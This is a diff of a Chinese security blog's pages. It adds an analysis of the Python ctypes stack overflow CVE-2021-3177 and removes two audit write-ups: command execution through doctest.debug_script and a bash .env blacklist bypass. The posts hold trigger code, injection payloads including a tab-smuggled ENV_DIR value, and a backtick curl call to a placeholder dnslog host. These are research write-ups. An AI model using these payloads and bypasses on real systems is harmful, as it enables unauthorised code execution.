- <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  本文仅仅分析了参数怎么控制rip指针，其中我学习到的点是”浮点数在内存中的表示”。</p>
-<p>  关于漏洞还有其他很多方面都没有分析，比如：</p>
-<ul>
-<li>怎么自动化检测这种漏洞？</li>
-<li>漏洞的实际影响是什么？<ul>
-<li>有多少Python应用存在漏洞？</li>
-</ul>
-</li>
-<li>漏洞触发的调用链是什么？</li>
-</ul>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/3095.html">C语言float、double的内存表示</a></p>
 
       
     </div>
@@ -778,6 +614,126 @@
 </ul>
 <p>第一种架构层面的绕过姿势比较难找，这种较为通用的绕过姿势，从攻击队视角来看我觉得比较适合扫描器来绕过防火墙。这也是<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qAv2wspeuCfhCjTaz03hNg">你的扫描器可以绕过防火墙么</a>系列文章名称的由来。</p>
 <p>后面就都写到这个”waf攻防实践”系列里来。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-Python%E6%A0%88%E6%BA%A2%E5%87%BACVE-2021-3177%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Python栈溢出CVE-2021-3177分析</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我正在学习缓冲区溢出，同时又对各个语言的安全问题感兴趣。最近看到 <a target="_blank" rel="noopener" href="https://bugs.python.org/issue42938">Python CVE-2021-3177</a> ，所以分析一下。</p>
+<p>从描述上看，这是一个sprintf函数引发的栈溢出漏洞。</p>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>因为本文主要分析的和Python执行流程关系不大，所以也可以忽略第一步调试环境搭建，直接看调试分析。</p>
+<ol>
+<li><p>搭建调试环境</p>
+<p> 我用的IDE是Clion</p>
+<p> 先搭建Python调试环境，编译出可调试的Python二进制程序。这一步可以参考官网 <a target="_blank" rel="noopener" href="https://devguide.python.org/">Guide</a></p>
+<p> 准备好漏洞测试的Python代码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line">x &#x3D; c_double.from_param(1e300)</span><br><span class="line"></span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>调试分析</p>
+<p> 在<code>_ctypes/callproc.c</code>下面代码打好断点</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p> 在IDE中可以看到 self-&gt;value.d 是double类型，且值就是我们传入的参数。</p>
+<p> 从这里可以看出来，这个CVE漏洞和下面这段C代码漏洞是一样的</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;1e300;  &#x2F;&#x2F;s值用户可控</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 所以接下来我就去研究学习上面的C代码中漏洞是怎么利用的。</p>
+</li>
+<li><p>sprintf引起的栈溢出分析</p>
+<p> <a target="_blank" rel="noopener" href="https://book.51cto.com/art/201311/419419.htm">网上文章</a>分析sprintf溢出都以<code>sprintf(buf, &quot;%s&quot;, s);</code>举例</p>
+<p> 对于 “%s” 格式符这种覆盖很容易理解，如果s=”a…a” 很多a字符时，就可以将rip覆盖成”\x6161616161616161”。</p>
+<p> 对于 “%f” 这种用浮点数字去覆盖buf变量，我就有一个疑问，浮点数怎么控制rip指针。比如s=11111111111111112222222233333333.0时，rip会被覆盖成什么？</p>
+<p> 先说自己的结论：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在漏洞代码中，double浮点数可以用来向很大内存中写入 &#96;\x30-\x39&#96;、&#96;\x2e&#96; 的字节。</span><br><span class="line"></span><br><span class="line">* 只能写入&#96;\x30-\x39&#96;、&#96;\x2e&#96;，而不能写其他字节，是因为 %f 转换成小数只能有&#96;[0-9.]&#96;，数字1-9对应的十六进制就是 &#96;\x30&#96;-&#96;\x39&#96;</span><br><span class="line">* 能覆盖多大的内存？</span><br><span class="line">    * 因为double类型，表示的小数位数能很大，所以至少可以覆盖300个字节</span><br><span class="line">    * 如果是float类型，就要小的多了</span><br></pre></td></tr></table></figure>
+
+<p> 结论是怎么来的呢？</p>
+<p> 首先我们要知道浮点数在计算机并不总是能够精确的被表示，只能被近似表示。更具体的细节需要去了解”浮点数在计算机中的存储”，可以看文末的参考资料。</p>
+<p> 所以 <code>double s=11111111111111112222222233333333.0</code> 在内存中，s的值并不一定是 <code>11111111111111112222222233333333.0</code></p>
+<p> 我在代码中加了一行<code>printf(&quot;%f\n&quot;,s);</code>打印s变量实际的值。</p>
+<p> 从下面的分析来看，在64位系统上 11111111111111112222222233333333.0 会把rip覆盖成”\x30\x38\x30\x32\x34\x33\x35\x33”。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">  char buf[2];</span><br><span class="line">  double s&#x3D;11111111111111112222222233333333.0; &#x2F;&#x2F;16个1，8个2，8个3</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; s实际的值是 1111111111111111 19575513 35342080.000000</span><br><span class="line">  &#x2F;&#x2F;            buf栈            rbp      rip</span><br><span class="line">  printf(&quot;%f\n&quot;,s);</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line"></span><br><span class="line">  print(&quot;&quot;.join([hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]))</span><br><span class="line">  &quot;35342080&quot;字符串对应 \x33\x35\x33\x34\x32\x30\x38\x30</span><br><span class="line"></span><br><span class="line">  &gt;&gt;&gt; x&#x3D;[hex(ord(i)).replace(&quot;0x&quot;,&quot;\\x&quot;) for i in &quot;35342080&quot;]</span><br><span class="line">  &gt;&gt;&gt; x.reverse()</span><br><span class="line">  &gt;&gt;&gt; print(&quot;&quot;.join(x))</span><br><span class="line">  \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line"></span><br><span class="line">  *&#x2F;</span><br><span class="line">  &#x2F;&#x2F; 所以rip会被覆盖成 \x30\x38\x30\x32\x34\x33\x35\x33</span><br><span class="line">  &#x2F;&#x2F; gdb验证后，符合预期</span><br><span class="line"></span><br><span class="line">  sprintf(buf, &quot;%f&quot;, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>_ctypes/callproc.c</code>其他代码有没有相同的栈溢出问题？<br> self-&gt;value.d在_ctypes/ctypes.h文件有定义，是一个union数据类型。</p>
+<p> 这个union类型中看着好像还有几个字段也能用在sprintf栈溢出中，如下：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    char c;</span><br><span class="line">    char b;</span><br><span class="line">    short h;</span><br><span class="line">    int i;</span><br><span class="line">    long l;</span><br><span class="line">    long long q;</span><br><span class="line">    long double D; &#x2F;&#x2F; 可以利用</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 可能可以</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
+
+<p> 在 _ctypes/callproc.c 文件看了看，结论是只有d变量可以利用。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">union &#123;</span><br><span class="line">    ...</span><br><span class="line">    long double D; &#x2F;&#x2F; 没有用到这个变量</span><br><span class="line">    double d;  &#x2F;&#x2F; 可以利用</span><br><span class="line">    float f;  &#x2F;&#x2F; 能覆盖的内存有限</span><br><span class="line">    void *p;  &#x2F;&#x2F; 因为只用到了 %p 打印地址，没有 %s ，所以也无法利用</span><br><span class="line">&#125; value;</span><br></pre></td></tr></table></figure>
+
+<p> _ctypes/callproc.c文件中，也只有下面的代码sprintf d变量。所以只有这一处是存在栈溢出的。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">case &#39;d&#39;:</span><br><span class="line">    sprintf(buffer, &quot;&lt;cparam &#39;%c&#39; (%f)&gt;&quot;,</span><br><span class="line">        self-&gt;tag, self-&gt;value.d);  &#x2F;&#x2F; 1e300</span><br><span class="line">    break;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>  本文仅仅分析了参数怎么控制rip指针，其中我学习到的点是”浮点数在内存中的表示”。</p>
+<p>  关于漏洞还有其他很多方面都没有分析，比如：</p>
+<ul>
+<li>怎么自动化检测这种漏洞？</li>
+<li>漏洞的实际影响是什么？<ul>
+<li>有多少Python应用存在漏洞？</li>
+</ul>
+</li>
+<li>漏洞触发的调用链是什么？</li>
+</ul>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="http://c.biancheng.net/cpp/html/3095.html">C语言float、double的内存表示</a></p>
 
       
     </div>
@@ -989,183 +945,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Python%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CCase/" class="post-title-link" itemprop="url">Python命令执行Case</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>在一次安全评估过程中，遇到了一个命令执行的点，但是存在部分限制。</p>
-<p>服务是用Python写的，漏洞点的代码精简一下大概如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;&quot;   # 用户可控</span><br><span class="line">user_input_function &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">user_input_argument &#x3D; &quot;&quot;  # 用户可控</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())   # 第二个参数必须存在</span><br></pre></td></tr></table></figure>
-
-<p>大概就是 <code>任意模块.任意函数(任意字符串,不可控的实例参数)</code> 。</p>
-<p>因为第二个参数必须存在，所以不能简单的调用 <code>os.system</code>函数来执行命令。</p>
-<p>我的想法就变成，怎么找到一个方法能够执行命令，且这个方法有两个参数，且第二个参数不影响命令执行。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>想到去遍历Python库，来看看有没有满足上述条件的方法。</p>
-<p>于是写了一小段代码来遍历Python默认安装的所有模块，扔给指定参数来尝试调用模块中的方法。如果没有报错，就打印函数后人工排查一下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">import os</span><br><span class="line">import re</span><br><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def fuzz_object(o):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    :param o:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    for k in o.__dict__:  </span><br><span class="line">        # print(k)</span><br><span class="line">        v &#x3D; o.__dict__[k]</span><br><span class="line">        if callable(v):   # 遍历模块所有的函数</span><br><span class="line">            try:</span><br><span class="line">                v(b&quot;xxxx&quot;, AnyClass())   # 如果函数接受两个参数，且第一个参数是bytes类型，第二个参数可以是任意实例，就把函数名打印出来。</span><br><span class="line">                print(o.__file__, k)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    abs_path &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;python&#x2F;3.7.7&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.7&#x2F;lib&#x2F;python3.7&quot;</span><br><span class="line">    for i in os.listdir(abs_path):  # 遍历Python自带的基础库</span><br><span class="line">        if os.path.isfile(abs_path + &quot;&#x2F;&quot; + i):</span><br><span class="line">            imp_module &#x3D; re.sub(r&#39;\.py$&#39;, &quot;&quot;, i)</span><br><span class="line">            try:</span><br><span class="line">                ip_module &#x3D; importlib.import_module(imp_module)</span><br><span class="line"></span><br><span class="line">                fuzz_object(ip_module)</span><br><span class="line">            except Exception as _:</span><br><span class="line">                print(_)</span><br><span class="line">            except KeyboardInterrupt:</span><br><span class="line">                pass</span><br><span class="line">        elif i not in [&quot;.&quot;, &quot;..&quot;]:  # 这里就不处理目录了</span><br><span class="line">            pass</span><br></pre></td></tr></table></figure>
-
-<p>结果测出很多函数都可以正常运行，没有报错。</p>
-<p>先说最终结论，<code>doctest.debug_script</code>函数完全满足要求</p>
-<p>测试一下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AnyClass(object):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_input_module &#x3D; &quot;doctest&quot;</span><br><span class="line">user_input_function &#x3D; &quot;debug_script&quot;</span><br><span class="line">user_input_argument &#x3D; &quot;import os;os.system(&#39;touch &#x2F;tmp&#x2F;qwer&#39;)&quot;  # 执行 touch &#x2F;tmp&#x2F;qwer</span><br><span class="line">imp_module &#x3D; importlib.import_module(user_input_module)</span><br><span class="line">func &#x3D; getattr(imp_module, user_input_function)</span><br><span class="line"></span><br><span class="line">arg &#x3D;  bytes(user_input_argument.encode(&quot;utf-8&quot;))</span><br><span class="line">func(arg, AnyClass())</span><br></pre></td></tr></table></figure>
-
-<p>测试过程中，也发现有很多其他的部分满足需求的函数，这里也一并记录。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">os.getenvb  可以读环境变量</span><br><span class="line"></span><br><span class="line">eval(xx,&#123;&#125;) 可以命令执行，但是需要第二个参数是dict</span><br><span class="line"></span><br><span class="line">pickletools.dis  输出opcode</span><br><span class="line"></span><br><span class="line">webbrowser.open(&quot;http:&#x2F;&#x2F;www.baidu.com&quot;,object)</span><br><span class="line"></span><br><span class="line">.&#x2F;idlelib&#x2F;calltip.get_entity</span><br><span class="line"></span><br><span class="line">timeit.timeit()  符合要求</span><br><span class="line"></span><br><span class="line">os.fwalk</span><br><span class="line"></span><br><span class="line">doctest.debug_script  完全符合要求，可以用来命令执行</span><br></pre></td></tr></table></figure>
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>寻找满足特定条件的X时，用遍历的思想让程序去找，总会有点收获。</p>
-<p>在另外一次针对bash脚本代码审计时也用到了这个简单但有效果的方法，找到了突破点。后面会写一篇介绍 ：）</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
-<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
-<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
-
-<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
-<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
-<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
-<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
-
-<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
-<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
-<p>代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>结果 \x09 也就是 \t 可以生成新变量。</p>
-<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
-<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
